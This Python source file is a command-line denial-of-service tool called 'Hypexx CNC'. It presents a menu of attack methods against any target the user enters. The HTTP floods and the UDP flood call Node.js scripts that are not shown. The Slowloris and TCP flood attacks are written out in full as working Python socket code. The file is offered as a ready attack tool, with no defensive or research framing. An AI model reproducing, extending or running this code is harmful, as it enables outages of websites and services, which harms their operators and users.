import os
import sys
import requests
import subprocess
import time
import random
import getpass

def supports_ansi():
    if os.name != 'nt':
        return True
    return 'ANSICON' in os.environ or 'WT_SESSION' in os.environ or 'TERM' in os.environ

USE_COLOR = supports_ansi()

def c(code):
    return code if USE_COLOR else ''

RESET = c('\033[0m')
BLUE = c('\033[1;34m')
CYAN = c('\033[1;36m')
GRAY = c('\033[1;30m')

CNC_ASCII_FRAMES = [
    f"""
{BLUE if USE_COLOR else ''}


$$\   $$\                                                   $$$$$$$\                      
$$ |  $$ |                                                  $$  __$$\                     
$$ |  $$ |$$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$ |  $$ | $$$$$$\ $$\    $$\ 
$$$$$$$$ |$$ |  $$ |$$  __$$\ $$  __$$\ \$$\ $$  |\$$\ $$  |$$ |  $$ |$$  __$$\\$$\  $$  |
$$  __$$ |$$ |  $$ |$$ /  $$ |$$$$$$$$ | \$$$$  /  \$$$$  / $$ |  $$ |$$$$$$$$ |\$$\$$  / 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____| $$  $$<   $$  $$<  $$ |  $$ |$$   ____| \$$$  /  
$$ |  $$ |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$  /\$$\ $$  /\$$\ $$$$$$$  |\$$$$$$$\   \$  /   
\__|  \__| \____$$ |$$  ____/  \_______|\__/  \__|\__/  \__|\_______/  \_______|   \_/    
          $$\   $$ |$$ |                                                                  
          \$$$$$$  |$$ |                                                                  
           \______/ \__|                                                                  


{'GitHub: @hypexxdev' if not USE_COLOR else CYAN + 'GitHub: @hypexxdev' + RESET}
{RESET}
"""
]

def clear_screen():
    os.system(r'cls' if os.name == 'nt' else 'clear')

def animate_ascii(frames, delay=0.15, repeat=1):
    for _ in range(repeat):
        for frame in frames:
            clear_screen()
            print(frame)
            time.sleep(delay)

def print_centered(text, width=90):
    for line in text.splitlines():
        print(line.center(width))

def show_cnc():
    animate_ascii(CNC_ASCII_FRAMES, delay=0.13, repeat=1)
    print((GRAY + "Welcome to " + CYAN + "Hypexx CNC" + RESET).center(90) if USE_COLOR else "Welcome to Hypexx CNC".center(90))
    print((CYAN + "Type " + BLUE + "'help'" + CYAN + " to see the commands." + RESET).center(90) if USE_COLOR else "Type 'help' to see the commands.".center(90))
    print("\n")

def show_methods():
    clear_screen()
    print(BLUE + "┌" + "─"*46 + "┐" + RESET if USE_COLOR else "┌" + "─"*46 + "┐")
    print("│{:^46s}│".format("HYPEXX METHODS"))
    print(BLUE + "├" + "─"*46 + "┤" + RESET if USE_COLOR else "├" + "─"*46 + "┤")
    print(f"│ {GRAY}http-raw    {CYAN}- Layer 7 HTTP request flood      │{RESET}" if USE_COLOR else "│ http-raw    - Layer 7 HTTP request flood      │")
    print(f"│ {GRAY}http-rand   {CYAN}- Layer 7 random path flood       │{RESET}" if USE_COLOR else "│ http-rand   - Layer 7 random path flood       │")
    print(f"│ {GRAY}http-cookie {CYAN}- Layer 7 cookie header flood     │{RESET}" if USE_COLOR else "│ http-cookie - Layer 7 cookie header flood     │")
    print(f"│ {GRAY}http-post   {CYAN}- Layer 7 POST data flood         │{RESET}" if USE_COLOR else "│ http-post   - Layer 7 POST data flood         │")
    print(f"│ {GRAY}udp-flood   {CYAN}- Layer 4 UDP packet flood        │{RESET}" if USE_COLOR else "│ udp-flood   - Layer 4 UDP packet flood        │")
    print(f"│ {GRAY}slowloris   {CYAN}- Layer 7 Slowloris (Python)      │{RESET}" if USE_COLOR else "│ slowloris   - Layer 7 Slowloris (Python)      │")
    print(f"│ {GRAY}tcp-flood   {CYAN}- Layer 4 TCP SYN flood (Python)  │{RESET}" if USE_COLOR else "│ tcp-flood   - Layer 4 TCP SYN flood (Python)  │")
    print(BLUE + "└" + "─"*46 + "┘" + RESET if USE_COLOR else "└" + "─"*46 + "┘\n")

def show_help():
    print(BLUE + "┌" + "─"*46 + "┐" + RESET if USE_COLOR else "┌" + "─"*46 + "┐")
    print("│{:^46s}│".format("HYPEXX HELP"))
    print(BLUE + "├" + "─"*46 + "┤" + RESET if USE_COLOR else "├" + "─"*46 + "┤")
    print(f"│ {GRAY}http-raw    {CYAN}- Start HTTP-RAW attack           │{RESET}" if USE_COLOR else "│ http-raw    - Start HTTP-RAW attack           │")
    print(f"│ {GRAY}http-rand   {CYAN}- Start HTTP-RAND attack          │{RESET}" if USE_COLOR else "│ http-rand   - Start HTTP-RAND attack          │")
    print(f"│ {GRAY}http-cookie {CYAN}- Start HTTP-COOKIE attack        │{RESET}" if USE_COLOR else "│ http-cookie - Start HTTP-COOKIE attack        │")
    print(f"│ {GRAY}http-post   {CYAN}- Start HTTP-POST attack          │{RESET}" if USE_COLOR else "│ http-post   - Start HTTP-POST attack          │")
    print(f"│ {GRAY}udp-flood   {CYAN}- Start UDP-FLOOD attack          │{RESET}" if USE_COLOR else "│ udp-flood   - Start UDP-FLOOD attack          │")
    print(f"│ {GRAY}slowloris   {CYAN}- Start SLOWLORIS attack          │{RESET}" if USE_COLOR else "│ slowloris   - Start SLOWLORIS attack          │")
    print(f"│ {GRAY}tcp-flood   {CYAN}- Start TCP-FLOOD attack          │{RESET}" if USE_COLOR else "│ tcp-flood   - Start TCP-FLOOD attack          │")
    print(f"│ {GRAY}methods     {CYAN}- Show attack methods             │{RESET}" if USE_COLOR else "│ methods     - Show attack methods             │")
    print(f"│ {GRAY}clear       {CYAN}- Clear and show CNC              │{RESET}" if USE_COLOR else "│ clear       - Clear and show CNC              │")
    print(f"│ {GRAY}help        {CYAN}- Show this help                  │{RESET}" if USE_COLOR else "│ help        - Show this help                  │")
    print(f"│ {GRAY}credit      {CYAN}- Show credits                    │{RESET}" if USE_COLOR else "│ credit      - Show credits                    │")
    print(f"│ {GRAY}exit        {CYAN}- Exit the program                │{RESET}" if USE_COLOR else "│ exit        - Exit the program                │")
    print(BLUE + "└" + "─"*46 + "┘" + RESET if USE_COLOR else "└" + "─"*46 + "┘\n")

def show_credits():
    print(BLUE + "┌" + "─"*46 + "┐" + RESET if USE_COLOR else "┌" + "─"*46 + "┐")
    print("│{:^46s}│".format("CREDITS"))
    print(BLUE + "├" + "─"*46 + "┤" + RESET if USE_COLOR else "├" + "─"*46 + "┤")
    print(f"│ {CYAN}Developed by:{RESET}                      │" if USE_COLOR else "│ Developed by:                      │")
    print(f"│   Hypexx                              │")
    print(BLUE + "└" + "─"*46 + "┘" + RESET if USE_COLOR else "└" + "─"*46 + "┘\n")

PROMPT_ASCII = (BLUE + "[root@localhost]" + RESET + " > ") if USE_COLOR else "[root@localhost] > "

def typewriter(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def animate_hacker_ascii(frames, delay=0.18, repeat=2):
    for _ in range(repeat):
        for frame in frames:
            clear_screen()
            print(frame)
            time.sleep(delay)

METHODS_ASCII = f'''
{BLUE}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                        {CYAN}💀 HYPEXX METHODS 💀{BLUE}                                 ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}
''' if USE_COLOR else '''
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                        💀 HYPEXX METHODS 💀                                 ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
'''

METHODS_LIST = [
    '🌐 HTTP-RAW      - Layer 7 HTTP request flood',
    '🎲 HTTP-RAND     - Layer 7 random path flood',
    '🍪 HTTP-COOKIE   - Layer 7 cookie header flood',
    '📤 HTTP-POST     - Layer 7 POST data flood',
    '📡 UDP-FLOOD     - Layer 4 UDP packet flood',
    '🐌 SLOWLORIS     - Layer 7 Slowloris (Python)',
    '🔨 TCP-FLOOD     - Layer 4 TCP SYN flood (Python)',
]

HELP_ASCII = f'''
{BLUE}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                 {CYAN}💡 HYPEXX COMMANDS 💡{BLUE}                                      ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}
 http-raw      - Start HTTP-RAW attack
 http-rand     - Start HTTP-RAND attack
 http-cookie   - Start HTTP-COOKIE attack
 http-post     - Start HTTP-POST attack
 udp-flood     - Start UDP-FLOOD attack
 slowloris     - Start SLOWLORIS attack
 tcp-flood     - Start TCP-FLOOD attack
 methods       - Show attack methods
 clear         - Clear and show CNC
 help          - Show this help
 exit          - Exit the program
''' if USE_COLOR else '''
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                 💡 HYPEXX COMMANDS 💡                                      ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 http-raw      - Start HTTP-RAW attack
 http-rand     - Start HTTP-RAND attack
 http-cookie   - Start HTTP-COOKIE attack
 http-post     - Start HTTP-POST attack
 udp-flood     - Start UDP-FLOOD attack
 slowloris     - Start SLOWLORIS attack
 tcp-flood     - Start TCP-FLOOD attack
 methods       - Show attack methods
 clear         - Clear and show CNC
 help          - Show this help
 exit          - Exit the program
'''

CREDITS_HACKER = f'''
{BLUE}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                {CYAN}CREDITS - HYPEXX{BLUE}                                         ║
║                                                                                                            ║
║   Developed by:                                                                                        ║
║      {CYAN}Hypexx{BLUE}                                                                                         ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}
''' if USE_COLOR else '''
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                CREDITS - HYPEXX                                         ║
║                                                                                                            ║
║   Developed by:                                                                                        ║
║      Hypexx                                                                                         ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
'''

def print_attack_sent_box(target, port, duration, method, sent_in, sent_by):
    blue = '\033[1;34m'
    cyan = '\033[1;36m'
    gray = '\033[1;30m'
    reset = '\033[0m'
    box_width = 56
    print(f"{blue}┌{'─'*box_width}┐{reset}")
    print(f"{blue}│{cyan}{'! Attack Sent !'.center(box_width)}{blue}│{reset}")
    print(f"{blue}├{'─'*box_width}┤{reset}")
    print(f"{blue}│{gray} Target:     {cyan}[{target}]{' '*(box_width-20-len(target))}{blue}│{reset}")
    print(f"{blue}│{gray} Port:    {cyan}[{port}]{' '*(box_width-20-len(str(port)))}{blue}│{reset}")
    print(f"{blue}│{gray} Duration:  {cyan}[{duration}]{' '*(box_width-20-len(str(duration)))}{blue}│{reset}")
    print(f"{blue}│{gray} Method:   {cyan}[{method}]{' '*(box_width-20-len(method))}{blue}│{reset}")
    print(f"{blue}│{gray} Sent in:{cyan}[{sent_in:.4f}s]{' '*(box_width-22-len(f'{sent_in:.4f}'))}{blue}│{reset}")
    print(f"{blue}│{gray} By:      {cyan}[{sent_by}]{' '*(box_width-20-len(sent_by))}{blue}│{reset}")
    print(f"{cyan}└{'─'*box_width}┘{reset}")

def run_http_raw():
    print("\n[HTTP-RAW] Enter target (URL): ", end='')
    target = input().strip()
    print("[HTTP-RAW] Enter time (seconds): ", end='')
    duration = int(input().strip())
    port = 443
    method = "HTTP-RAW"
    start = time.time()
    print("[INFO] Starting HTTP-RAW attack using Node.js script in resources...")
    resources_dir = os.path.join(os.path.dirname(__file__), 'resources')
    js_path = os.path.join(resources_dir, 'HTTP-RAW.js')
    ua_path = os.path.join(resources_dir, 'user-agents.txt')
    if not os.path.exists(ua_path):
        print("[INFO] Downloading user-agents.txt...")
        try:
            r = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt')
            with open(ua_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            print("[INFO] user-agents.txt downloaded.")
        except Exception as e:
            print(f"[ERROR] Failed to download user-agents.txt: {e}")
            return
    try:
        subprocess.Popen(['node', js_path, target, str(duration), ua_path])
        sent_in = time.time() - start
        clear_screen()
        print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
        input('\nPress Enter to return to CNC...')
        show_cnc()
    except Exception as e:
        print(f"[ERROR] Failed to start HTTP-RAW.js: {e}")

def run_http_rand():
    print("\n[HTTP-RAND] Enter target (URL): ", end='')
    target = input().strip()
    print("[HTTP-RAND] Enter time (seconds): ", end='')
    duration = int(input().strip())
    port = 443
    method = "HTTP-RAND"
    start = time.time()
    print("[INFO] Starting HTTP-RAND attack using Node.js script in resources...")
    resources_dir = os.path.join(os.path.dirname(__file__), 'resources')
    js_path = os.path.join(resources_dir, 'HTTP-RAND.js')
    ua_path = os.path.join(resources_dir, 'user-agents.txt')
    if not os.path.exists(ua_path):
        print("[INFO] Downloading user-agents.txt...")
        try:
            r = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt')
            with open(ua_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            print("[INFO] user-agents.txt downloaded.")
        except Exception as e:
            print(f"[ERROR] Failed to download user-agents.txt: {e}")
            return
    try:
        subprocess.Popen(['node', js_path, target, str(duration), ua_path])
        sent_in = time.time() - start
        clear_screen()
        print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
        input('\nPress Enter to return to CNC...')
        show_cnc()
    except Exception as e:
        print(f"[ERROR] Failed to start HTTP-RAND.js: {e}")

def run_http_cookie():
    print("\n[HTTP-COOKIE] Enter target (URL): ", end='')
    target = input().strip()
    print("[HTTP-COOKIE] Enter time (seconds): ", end='')
    duration = int(input().strip())
    port = 443
    method = "HTTP-COOKIE"
    start = time.time()
    print("[INFO] Starting HTTP-COOKIE attack using Node.js script in resources...")
    resources_dir = os.path.join(os.path.dirname(__file__), 'resources')
    js_path = os.path.join(resources_dir, 'HTTP-COOKIE.js')
    ua_path = os.path.join(resources_dir, 'user-agents.txt')
    if not os.path.exists(ua_path):
        print("[INFO] Downloading user-agents.txt...")
        try:
            r = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt')
            with open(ua_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            print("[INFO] user-agents.txt downloaded.")
        except Exception as e:
            print(f"[ERROR] Failed to download user-agents.txt: {e}")
            return
    try:
        subprocess.Popen(['node', js_path, target, str(duration), ua_path])
        sent_in = time.time() - start
        clear_screen()
        print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
        input('\nPress Enter to return to CNC...')
        show_cnc()
    except Exception as e:
        print(f"[ERROR] Failed to start HTTP-COOKIE.js: {e}")

def run_http_post():
    print("\n[HTTP-POST] Enter target (URL): ", end='')
    target = input().strip()
    print("[HTTP-POST] Enter time (seconds): ", end='')
    duration = int(input().strip())
    port = 443
    method = "HTTP-POST"
    start = time.time()
    print("[INFO] Starting HTTP-POST attack using Node.js script in resources...")
    resources_dir = os.path.join(os.path.dirname(__file__), 'resources')
    js_path = os.path.join(resources_dir, 'HTTP-POST.js')
    ua_path = os.path.join(resources_dir, 'user-agents.txt')
    if not os.path.exists(ua_path):
        print("[INFO] Downloading user-agents.txt...")
        try:
            r = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt')
            with open(ua_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            print("[INFO] user-agents.txt downloaded.")
        except Exception as e:
            print(f"[ERROR] Failed to download user-agents.txt: {e}")
            return
    try:
        subprocess.Popen(['node', js_path, target, str(duration), ua_path])
        sent_in = time.time() - start
        clear_screen()
        print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
        input('\nPress Enter to return to CNC...')
        show_cnc()
    except Exception as e:
        print(f"[ERROR] Failed to start HTTP-POST.js: {e}")

def run_udp_flood():
    print("\n[UDP-FLOOD] Enter target (IP): ", end='')
    target = input().strip()
    print("[UDP-FLOOD] Enter port: ", end='')
    port = int(input().strip())
    print("[UDP-FLOOD] Enter time (seconds): ", end='')
    duration = int(input().strip())
    method = "UDP-FLOOD"
    start = time.time()
    print("[INFO] Starting UDP-FLOOD attack using Node.js script in resources...")
    resources_dir = os.path.join(os.path.dirname(__file__), 'resources')
    js_path = os.path.join(resources_dir, 'UDP-FLOOD.js')
    try:
        subprocess.Popen(['node', js_path, target, str(port), str(duration)])
        sent_in = time.time() - start
        clear_screen()
        print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
        input('\nPress Enter to return to CNC...')
        show_cnc()
    except Exception as e:
        print(f"[ERROR] Failed to start UDP-FLOOD.js: {e}")

def run_slowloris():
    print("\n[SLOWLORIS] Enter target (host): ", end='')
    target = input().strip()
    print("[SLOWLORIS] Enter port (default 80): ", end='')
    port = input().strip()
    port = int(port) if port else 80
    print("[SLOWLORIS] Enter time (seconds): ", end='')
    duration = int(input().strip())
    method = "SLOWLORIS"
    start = time.time()
    print("[INFO] Starting SLOWLORIS attack (Python)... Press Ctrl+C to stop early.")
    import threading
    import time as t
    import socket
    import signal
    stop_time = t.time() + duration
    running = True
    def signal_handler(sig, frame):
        nonlocal running
        running = False
        print("\n[INFO] SLOWLORIS interrupted by user (Ctrl+C). Stopping...")
    signal.signal(signal.SIGINT, signal_handler)
    def slowloris():
        sockets = []
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(b"GET /?" + str(duration).encode() + b" HTTP/1.1\r\n")
                s.send(b"Host: " + target.encode() + b"\r\n")
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.send(b"Accept-language: en-US,en,q=0.5\r\n")
                sockets.append(s)
            except Exception:
                pass
        while running and t.time() < stop_time:
            for s in list(sockets):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    sockets.remove(s)
            t.sleep(10)
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
    th = threading.Thread(target=slowloris)
    th.daemon = True
    th.start()
    try:
        th.join()
    except KeyboardInterrupt:
        print("\n[INFO] SLOWLORIS stopped by user.")
    sent_in = time.time() - start
    clear_screen()
    print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
    input('\nPress Enter to return to CNC...')
    show_cnc()
    print("[INFO] SLOWLORIS finished.")

def run_tcp_flood():
    print("\n[TCP-FLOOD] Enter target (IP): ", end='')
    target = input().strip()
    print("[TCP-FLOOD] Enter port: ", end='')
    port = int(input().strip())
    print("[TCP-FLOOD] Enter time (seconds): ", end='')
    duration = int(input().strip())
    method = "TCP-FLOOD"
    start = time.time()
    print("[INFO] Starting TCP-FLOOD attack (Python)...")
    import threading
    import time as t
    import socket
    import random
    stop_time = t.time() + duration
    def tcp_flood():
        while t.time() < stop_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.send(random._urandom(1024))
                s.close()
            except Exception:
                pass
    th = threading.Thread(target=tcp_flood)
    th.daemon = True
    th.start()
    print(f"[INFO] TCP-FLOOD started for {duration} seconds!")
    try:
        th.join()
    except KeyboardInterrupt:
        print("\n[INFO] TCP-FLOOD stopped by user.")
    sent_in = time.time() - start
    clear_screen()
    print_attack_sent_box(target, port, duration, method, sent_in, getpass.getuser())
    input('\nPress Enter to return to CNC...')
    show_cnc()
    print("[INFO] TCP-FLOOD finished.")

def main():
    show_cnc()
    while True:
        try:
            cmd = input(PROMPT_ASCII).strip().lower()
            if cmd == 'http-raw':
                run_http_raw()
            elif cmd == 'http-rand':
                run_http_rand()
            elif cmd == 'http-cookie':
                run_http_cookie()
            elif cmd == 'http-post':
                run_http_post()
            elif cmd == 'udp-flood':
                run_udp_flood()
            elif cmd == 'slowloris':
                run_slowloris()
            elif cmd == 'tcp-flood':
                run_tcp_flood()
            elif cmd == 'methods':
                show_methods()  
            elif cmd == 'clear':
                show_cnc()
            elif cmd == 'help':
                show_help()
            elif cmd == 'credit':
                show_credits()
            elif cmd == 'exit':
                print("Exiting...")
                sys.exit(0)
            elif cmd == '':
                continue
            else:
                print("Unknown command. Type 'help' for a list of commands.")
        except (KeyboardInterrupt, EOFError):
            print("\nExiting...")
            break

if __name__ == '__main__':
    main()
